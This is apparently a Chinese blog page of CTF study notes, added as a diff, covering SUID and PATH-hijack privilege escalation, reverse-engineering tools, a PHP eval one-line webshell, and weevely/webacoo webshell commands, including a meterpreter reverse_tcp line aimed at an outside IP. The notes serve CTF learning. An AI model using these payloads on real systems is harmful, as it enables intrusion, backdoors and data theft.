+            <span class="post-title" title="python 一劳永逸的 decode 字符串转换方法">python 一劳永逸的 decode 字符串转换方法</span>
+            <span class="post-date" title="2021-07-12 14:10:40">2021/07/12</span>
+        </a>
+        
+        <a  class="全部文章 科学 "
+           href="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/"
+           data-tag="物理"
+           data-author="" >
+            <span class="post-title" title="相对论">相对论</span>
+            <span class="post-date" title="2021-07-06 16:50:54">2021/07/06</span>
+        </a>
+        
+        <a  class="全部文章 科学 "
+           href="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/"
+           data-tag="物理"
+           data-author="" >
+            <span class="post-title" title="量子力学">量子力学</span>
+            <span class="post-date" title="2021-07-06 16:28:22">2021/07/06</span>
+        </a>
+        
+        <a  class="全部文章 渗透 知识点 "
+           href="/2021/07/06/shell-%E9%80%9F%E6%9F%A5%E8%A1%A8/"
+           data-tag="linux,shell"
+           data-author="" >
+            <span class="post-title" title="shell 速查表">shell 速查表</span>
+            <span class="post-date" title="2021-07-06 10:18:44">2021/07/06</span>
+        </a>
+        
+        <a  class="全部文章 工具 "
+           href="/2021/07/06/docker/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="Docker 技术">Docker 技术</span>
+            <span class="post-date" title="2021-07-06 09:51:16">2021/07/06</span>
+        </a>
+        
+        <a  class="全部文章 前端技术 "
+           href="/2021/07/05/hexo-%E9%83%A8%E7%BD%B2/"
+           data-tag="github,git"
+           data-author="" >
+            <span class="post-title" title="hexo 部署">hexo 部署</span>
+            <span class="post-date" title="2021-07-05 17:08:54">2021/07/05</span>
+        </a>
+        
+        <a  class="全部文章 前端技术 "
+           href="/2021/06/28/docu%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/"
+           data-tag="docusaurus"
+           data-author="" >
+            <span class="post-title" title="Docusaurus 实现搜索功能">Docusaurus 实现搜索功能</span>
+            <span class="post-date" title="2021-06-29 00:00:00">2021/06/29</span>
+        </a>
+        
+        <a  class="全部文章 前端技术 "
+           href="/2021/06/28/docu%E6%8A%A5%E9%94%99%E6%B8%85%E5%8D%95/"
+           data-tag="docusaurus"
+           data-author="" >
+            <span class="post-title" title="Docusaurus 报错清单">Docusaurus 报错清单</span>
+            <span class="post-date" title="2021-06-29 00:00:00">2021/06/29</span>
+        </a>
+        
+        <a  class="全部文章 前端技术 "
+           href="/2021/06/23/docu-%E7%9A%84%E5%A4%9A%E5%AE%9E%E4%BE%8B%E6%96%87%E6%A1%A3/"
+           data-tag="docusaurus"
+           data-author="" >
+            <span class="post-title" title="Docusaurus 的多实例文档部署">Docusaurus 的多实例文档部署</span>
+            <span class="post-date" title="2021-06-24 00:00:00">2021/06/24</span>
+        </a>
+        
+        <a  class="全部文章 前端技术 "
+           href="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/"
+           data-tag="github,docusaurus"
+           data-author="" >
+            <span class="post-title" title="使用 Github Pages 部署 Blog">使用 Github Pages 部署 Blog</span>
+            <span class="post-date" title="2021-06-23 00:00:00">2021/06/23</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-CTF-基础知识点" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">CTF 基础知识点</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="渗透">渗透</a> > 
+            
+            <a  data-rel="渗透&lt;---&gt;知识点">知识点</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2022-02-10 09:15:38'>2021-12-31 16:52</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%AD%E7%BB%83%E7%AB%99%E7%82%B9"><span class="toc-text">训练站点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F-Exploit"><span class="toc-text">系统 Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Exploit"><span class="toc-text">Linux Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C%E7%BC%96%E8%AF%91"><span class="toc-text">C编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E4%BD%BF%E7%94%A8%E7%9A%84%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-text">查看可使用的执行文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F%E6%94%BB%E5%87%BB"><span class="toc-text">修改变量攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%94%BB%E5%87%BB"><span class="toc-text">system() 任意命令攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Exploit"><span class="toc-text">Windows Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E5%BA%8F%EF%BC%88%E5%B0%8F%E7%AB%AF%E6%9C%BA%E5%92%8C%E5%A4%A7%E7%AB%AF%E6%9C%BA%EF%BC%89"><span class="toc-text">字节序（小端机和大端机）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B"><span class="toc-text">逆向工程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%B7%A5%E5%85%B7"><span class="toc-text">静态工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#objdump"><span class="toc-text">objdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strings"><span class="toc-text">strings</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ldd"><span class="toc-text">ldd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-text">file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checksec"><span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91"><span class="toc-text">十六进制编辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-text">动态调试工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%B1%E5%A3%B3"><span class="toc-text">脱壳</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UPX"><span class="toc-text">UPX</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE"><span class="toc-text">其他类型题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%8B%AC"><span class="toc-text">数独</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%9B%BE%E7%89%87%E7%9A%84%E9%AA%8C%E8%AF%81"><span class="toc-text">对图片的验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-webshell"><span class="toc-text">上传 webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E4%BD%93"><span class="toc-text">变体</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell-%E5%B7%A5%E5%85%B7"><span class="toc-text">webshell 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CKnife"><span class="toc-text">CKnife</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#webcaoo"><span class="toc-text">webcaoo</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#weevely"><span class="toc-text">weevely</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件上传漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwntools"><span class="toc-text">Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5"><span class="toc-text">连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E5%92%8C%E6%8E%A5%E6%94%B6"><span class="toc-text">发送和接收</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E7%A0%81"><span class="toc-text">转码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92"><span class="toc-text">交互</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A8%A1%E6%9D%BF"><span class="toc-text">基本模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E5%86%99%E6%9C%AF"><span class="toc-text">隐写术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF"><span class="toc-text">图片的隐写术</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LSB-%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D-Least-Significant-Bit"><span class="toc-text">LSB 最低有效位 (Least Significant Bit)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E7%9A%84%E5%8F%A0%E5%8A%A0"><span class="toc-text">图片的叠加</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9F%B3%E9%A2%91%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF"><span class="toc-text">音频的隐写术</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%AB%E6%96%AF%E5%AF%86%E7%A0%81"><span class="toc-text">莫斯密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%91%E8%B0%B1%E5%9B%BE"><span class="toc-text">频谱图</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%8C%85%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF"><span class="toc-text">网络包的隐写术</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%9C%A8tcp%E6%B5%81%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95"><span class="toc-text">隐藏在tcp流中的文件提取方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%8A%A5%E6%96%87%E7%9A%84%E9%95%BF%E5%BA%A6%E4%BC%A0%E9%80%92%E4%BF%A1%E6%81%AF"><span class="toc-text">通过报文的长度传递信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cap%E6%96%87%E4%BB%B6%E8%BD%BD%E5%85%A5%E5%87%BA%E9%94%99"><span class="toc-text">cap文件载入出错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%86flag%E6%94%BE%E5%9C%A8IP%E5%A4%B4%E9%83%A8%E4%B8%AD"><span class="toc-text">将flag放在IP头部中</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSL%E5%8A%A0%E5%AF%86%E6%8A%A5%E6%96%87"><span class="toc-text">SSL加密报文</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E9%83%A8%E7%A0%B4%E5%9D%8F"><span class="toc-text">文件头部破坏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GIF"><span class="toc-text">GIF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PNG"><span class="toc-text">PNG</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E6%9C%AC%E8%BD%AC%E5%88%B0%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-text">文本转到二进制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-ZIP-%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-text">关于 ZIP 的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%BD%AF%E4%BB%B6"><span class="toc-text">爆破软件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%AF%86%E7%A0%81"><span class="toc-text">伪密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-text">明文攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LZIP-%E6%96%87%E4%BB%B6"><span class="toc-text">LZIP 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">python 反编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-text">加解密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E9%9B%86"><span class="toc-text">在线工具集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quoted-printable%E7%BC%96%E7%A0%81"><span class="toc-text">Quoted-printable编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXencode"><span class="toc-text">XXencode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5"><span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6"><span class="toc-text">二进制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsFuck"><span class="toc-text">JsFuck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bubblepy"><span class="toc-text">bubblepy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PDF417"><span class="toc-text">PDF417</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E5%88%86%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81"><span class="toc-text">差分曼彻斯特编码</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-4 i,
+    .toc-level-4 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="训练站点"><a href="#训练站点" class="headerlink" title="训练站点"></a>训练站点</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/79783253">推荐规划</a></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion">i春秋训练平台</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.wechall.net/sites.php">We Chall</a> 国外收集的CTF平台</li>
+<li><a target="_blank" rel="noopener" href="https://microcorruption.com/login">很炫酷游戏化</a></li>
+</ul>
+<h2 id="系统-Exploit"><a href="#系统-Exploit" class="headerlink" title="系统 Exploit"></a>系统 Exploit</h2><h3 id="Linux-Exploit"><a href="#Linux-Exploit" class="headerlink" title="Linux Exploit"></a>Linux Exploit</h3><h3 id="C编译"><a href="#C编译" class="headerlink" title="C编译"></a>C编译</h3><p>应当不用保护</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-llvm codeBlockLines"><span class="line">gcc <span class="hljs-number">1</span>.<span class="hljs-keyword">c</span> -o <span class="hljs-number">1</span> -O<span class="hljs-number">0</span> -fno-stack-protector -z execstack <span class="hljs-number">1</span>.<span class="hljs-keyword">c</span> -o <span class="hljs-number">1</span></span>
+<span class="line"></br></span>
+<span class="line">-m<span class="hljs-number">32</span>： <span class="hljs-number">32</span>bit 编译</span>
+</code></pre></div></div>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/173903.html">参考</a>这篇文章</li>
+</ul>
+<h4 id="查看可使用的执行文件"><a href="#查看可使用的执行文件" class="headerlink" title="查看可使用的执行文件"></a>查看可使用的执行文件</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type  f 2 &gt;/dev/<span class="hljs-literal">null</span></span>
+</code></pre></div></div>
+<p>通过这个命令查看哪些文件可以被现在的用户使用，并找到提权方法。</p>
+<h4 id="修改变量攻击"><a href="#修改变量攻击" class="headerlink" title="修改变量攻击"></a>修改变量攻击</h4><p>思路是找到<code>s</code>权限的执行文件，这个执行文件包括调用了更高级别的命令。<br>那么就可以通过修改其中的命令的调用地址来达到目的</p>
+<p>比如<code>flag01</code>使用到了<code>ps</code>命令</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-powershell codeBlockLines"><span class="line"><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/<span class="hljs-built_in">ps</span></span>
+<span class="line"><span class="hljs-variable">$</span> chmod <span class="hljs-number">777</span> /tmp/<span class="hljs-built_in">ps</span></span>
+<span class="line"><span class="hljs-variable">$</span> export PATH=/tmp:<span class="hljs-variable">$PATH</span></span>
+<span class="line"><span class="hljs-variable">$</span> ./flag01</span>
+</code></pre></div></div>
+
+<h4 id="system-任意命令攻击"><a href="#system-任意命令攻击" class="headerlink" title="system() 任意命令攻击"></a>system() 任意命令攻击</h4><p>原理是使用print系函数向<code>buff</code>中写入了可选字符串，然后通过<code>system()</code>运行</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cpp codeBlockLines"><span class="line"><span class="hljs-built_in">asprintf</span>(&amp;buffer, <span class="hljs-string">&quot;/bin/echo %s is cool&quot;</span>, <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;USER&quot;</span>));</span>
+<span class="line"><span class="hljs-built_in">system</span>(buffer);</span>
+</code></pre></div></div>
+<p>上例中就将<code>getenv(&#39;USER&#39;)</code>作为变量输入，利用方法就是修改环境变量达到任意命令的写入</p>
+<h3 id="Windows-Exploit"><a href="#Windows-Exploit" class="headerlink" title="Windows Exploit"></a>Windows Exploit</h3><h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2519">总结文章</a></li>
+</ul>
+<h3 id="字节序（小端机和大端机）"><a href="#字节序（小端机和大端机）" class="headerlink" title="字节序（小端机和大端机）"></a>字节序（小端机和大端机）</h3><p>一般来说，WIndows和Linux都是使用的小端机模式。<br>而网络传输使用的是大端机</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> struct</span>
+<span class="line">struct.pack(<span class="hljs-string">&#x27;&lt;i&#x27;</span>, <span class="hljs-number">0x01020304</span>)</span>
+<span class="line"></br></span>
+<span class="line"><span class="hljs-comment"># &lt; 是小端模式</span></span>
+<span class="line"><span class="hljs-comment"># i 是整数型</span></span>
+</code></pre></div></div>
+
+<h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><p>大部分因为都是Linux下面的题目，所以下面写的默认为Linux操作</p>
+<h3 id="静态工具"><a href="#静态工具" class="headerlink" title="静态工具"></a>静态工具</h3><h4 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h4><ol>
+<li>将整个文件反汇编Dump下来</li>
+</ol>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-angelscript codeBlockLines"><span class="line">objdump -d -M <span class="hljs-built_in">int</span>el &lt;file_name&gt; &gt; dump.asm</span>
+</code></pre></div></div>
+
+<ol start="2">
+<li>获取 got 表</li>
+</ol>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">objdump -R <span class="hljs-tag">&lt;<span class="hljs-name">file_name</span>&gt;</span></span>
+</code></pre></div></div>
+
+<h4 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h4><p>用于查找文件中的字符串</p>
+<h4 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h4><p>用于查看动态链接库</p>
+<h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>查看文件类型</p>
+<h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>查看保护状态</p>
+<h4 id="十六进制编辑"><a href="#十六进制编辑" class="headerlink" title="十六进制编辑"></a>十六进制编辑</h4><p><code>hexeditor -b &lt;file&gt;</code></p>
+<ul>
+<li><code>ctrl + i</code> 十六进制和文本切换</li>
+<li><code>ctrl + a</code> 插入</li>
+<li><code>ctrl + d</code> 删除</li>
+<li><code>ctrl + o</code> 保存</li>
+</ul>
+<h3 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h3><p><a target="_blank" rel="noopener" href="https://x64dbg.com/#start">X64dbg</a></p>
+<h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>当看到其中包含大量的加密字段，不要怀疑是否需要解密，直接找找字符串，看是什么壳</p>
+<h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><ul>
+<li>upx 这样的经典壳可以自动脱壳</li>
+</ul>
+<p><code>upx -d &lt;file&gt;</code></p>
+<h3 id="其他类型题目"><a href="#其他类型题目" class="headerlink" title="其他类型题目"></a>其他类型题目</h3><h4 id="数独"><a href="#数独" class="headerlink" title="数独"></a>数独</h4><p>要做数独，一定会给出基础数字以及体积关系，比如<code>9*9</code>大小的各个数存在内存中。</p>
+<p>所以解题逻辑就是找到申请的内存，然后再找到初始化的数值。<br>最后通过<a target="_blank" rel="noopener" href="https://shudu.gwalker.cn/">在线网站</a>解出答案<br>提交的flag原始数据替换为0，因为提交的答案是要验证的。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="对图片的验证"><a href="#对图片的验证" class="headerlink" title="对图片的验证"></a>对图片的验证</h3><p>使用的是google开源的图片识别系统<code>pytesseract</code><br>对图像的打开使用的是<code>PIL</code> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wei-li/archive/2012/04/19/2443281.html">Python Image Library</a></p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> pytesseract</span>
+<span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span>
+<span class="line"></br></span>
+<span class="line">img = Image.<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;code.png&#x27;</span>)</span>
+<span class="line"><span class="hljs-type">text</span> = pytesseract.image_to_string(img)</span>
+</code></pre></div></div>
+
+<h3 id="上传-webshell"><a href="#上传-webshell" class="headerlink" title="上传 webshell"></a>上传 webshell</h3><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>基本型</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-meta">&lt;?php</span></span>
+<span class="line">  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);</span>
+<span class="line"><span class="hljs-meta">?&gt;</span></span>
+</code></pre></div></div>
+
+<h5 id="变体"><a href="#变体" class="headerlink" title="变体"></a>变体</h5><p><a target="_blank" rel="noopener" href="http://www.secist.com/archives/1947.html">这里</a>是变形体的总结</p>
+<ol>
+<li>修改脚本语言标签</li>
+</ol>
+<p><code>&lt;?php ?&gt;</code> 为 <code>&lt;script language=&quot;PHP&quot;&gt; &lt;/script&gt;</code></p>
+<p>注意为<code>&quot;</code></p>
+<h4 id="webshell-工具"><a href="#webshell-工具" class="headerlink" title="webshell 工具"></a>webshell 工具</h4><h5 id="CKnife"><a href="#CKnife" class="headerlink" title="CKnife"></a>CKnife</h5><p>这里是跨平台CKnife的 <a target="_blank" rel="noopener" href="https://github.com/Chora10/Cknife">Github</a> 地址</p>
+<h5 id="webcaoo"><a href="#webcaoo" class="headerlink" title="webcaoo"></a>webcaoo</h5><ul>
+<li><p>生成</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line">webacoo -g -o <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span></span>
+</code></pre></div></div></li>
+<li><p>连接</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">webacoo -t -u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span></span>
+</code></pre></div></div></li>
+</ul>
+<h5 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h5><ul>
+<li>生成</li>
+</ul>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-verilog codeBlockLines"><span class="line">weevely <span class="hljs-keyword">generate</span> &lt;password&gt; &lt;path&gt;</span>
+</code></pre></div></div>
+
+<ul>
+<li>连接</li>
+</ul>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">weevely <span class="hljs-tag">&lt;<span class="hljs-name">URL</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span> [cmd]</span>
+</code></pre></div></div>
+
+<ul>
+<li>常用命令<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-elixir codeBlockLines"><span class="line"><span class="hljs-symbol">:system_info</span> 收集系统基本信息</span>
+<span class="line"><span class="hljs-symbol">:audit_filesystem</span> 查找系统文件中的弱权限</span>
+<span class="line"><span class="hljs-symbol">:audit_suidsgid</span> 查找有使用高级权限的文件</span>
+<span class="line"><span class="hljs-symbol">:shell_sh</span> 执行SHELL命令</span>
+<span class="line"><span class="hljs-symbol">:backdoor_meterpreter</span> 通过meterpreter连接</span>
+<span class="line">&gt; backdoor_meterpreter -payload linux/x64/meterpreter/reverse_tcp -host <span class="hljs-number">144.34</span>.<span class="hljs-number">215.199</span> -port <span class="hljs-number">4444</span></span>
+<span class="line">&gt; msfconsole(LHOST <span class="hljs-number">127.0</span>.0.<span class="hljs-number">1</span>)</span>
+<span class="line"><span class="hljs-symbol">:file_download</span> 下载文件</span>
+<span class="line"><span class="hljs-symbol">:sql_console</span> sql交互</span>
+<span class="line"><span class="hljs-symbol">:sql_dump</span> 脱库</span>
+<span class="line"><span class="hljs-symbol">:net_scan</span> 网络扫描</span>
+</code></pre></div></div></li>
+</ul>
+<h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><ol>
+<li>在<code>phpinfo()</code>中<code>allow_url_include</code>处于开启状态，意味着可以使用<code>RAW_POST</code>提交数据</li>
+</ol>
